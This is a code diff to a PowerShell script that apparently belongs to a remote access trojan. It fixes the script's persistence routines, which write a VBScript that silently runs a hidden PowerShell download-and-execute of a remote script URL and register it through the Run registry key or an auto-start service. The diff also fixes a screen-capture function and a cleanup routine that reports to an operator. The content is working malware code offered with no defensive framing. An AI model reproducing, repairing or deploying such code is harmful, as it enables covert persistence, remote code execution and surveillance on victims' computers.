@@ -17,11 +17,12 @@ function isAdmin {
  
 function user-persist {
     echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $SVCPATH
-    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0' >> $SVCPATH
+    echo ('oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0') >> $SVCPATH
     New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $SVC_NAME -Value $SVCPATH
     
     SendOutput "User persistence OK";
 }
+
 
 function admin-persist {
     
@@ -37,8 +38,8 @@ function admin-persist {
     }
    
     echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $SVCPATH
-    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0' >> $SVCPATH 
-    cmd.exe /c sc create $SVC_NAME binPath= "wscript.exe $SVCPATH" start= auto
+    echo ('oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0') >> $SVCPATH 
+    sc.exe create $SVC_NAME binPath= "wscript.exe $SVCPATH" start= auto
 
     SendOutput "Admin persistence OK";
 }
@@ -50,7 +51,7 @@ function eject {
     Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $SVC_NAME
     if (isAdmin) {
         SendOutput "Removing service"
-        cmd.exe /c sc delete $SVC_NAME
+        sc.exe delete $SVC_NAME
     }
     SendOutput "Everything clean. Killing process...bye !"
     exit
@@ -95,6 +96,7 @@ function download {
 }
 
  Function screenshot {
+    Add-Type -AssemblyName System.Windows.Forms
     $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
     $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
     $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
